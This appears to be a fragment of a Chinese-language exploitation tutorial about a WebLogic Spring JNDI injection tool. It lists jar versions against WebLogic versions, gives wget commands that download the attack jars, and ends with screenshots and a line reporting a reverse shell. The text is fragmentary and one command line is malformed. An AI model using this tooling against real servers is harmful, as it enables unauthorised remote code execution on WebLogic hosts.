...
> 原文：[https://www.zhihuifly.com/t/topic/3227](https://www.zhihuifly.com/t/topic/3227)
...
weblogic-spring-jndi-12.2.1.3.jar 对应weblogic： 12.2.1.3

weblogic-spring-jndi-10.3.6.0.jar 对应weblogic： 10.3.6.0,12.2.1.0,12.1.3.0,12.2.1.1
...
![1.jpg](img/52f211ba277ddf6f938bfa969dafa079.png)
...
![2.jpg](img/ce7b1f55a7d0ee155405d346ff820d94.png)
...
```
wget https://download.0-sec.org/download/weblogic-spring-jndi-10.3.6.0.jar `wget  [https://download.0-sec.org/download/weblogic-spring-jndi-12.2.1.3.jar](https://download.0-sec.org/download/weblogic-spring-jndi-12.2.1.3.jar)` 
```
...
![3.jpg](img/93bea96057d15f794a50a25bfbfef1c0.png)
最终可以看到反弹的shell:

![4.png](img/3412bcd065c8e2761675b7c19f99df3c.png)